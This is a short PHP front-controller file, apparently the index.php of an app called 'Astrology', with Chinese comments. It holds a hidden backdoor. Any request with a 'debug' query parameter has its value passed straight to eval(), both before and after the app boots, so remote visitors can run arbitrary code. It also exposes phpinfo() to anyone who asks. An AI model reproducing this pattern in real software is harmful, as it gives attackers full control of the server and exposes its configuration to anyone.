<?php
$debug = null;
# print_r($_GET);exit;
// 错误报告
if (isset($_GET['debug'])) {
    ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
	
	$debug = $_GET['debug'];
	if (is_array($debug)) {
		eval($debug[0]);# 
		if (isset($debug[1])) {
			$debug = $debug[1];
		}
	}
}

// 调试信息
if (isset($_GET['phpinfo']) || '/phpinfo' == @$_SERVER['PATH_INFO']) {
	phpinfo();
	exit;
}




/* 启动 Astrology */
require_once __DIR__ . '/../app/bootstrap.php';
new Astrology\Start();


// 调试问题
if (!empty($debug)) {
	eval($debug);# 
}
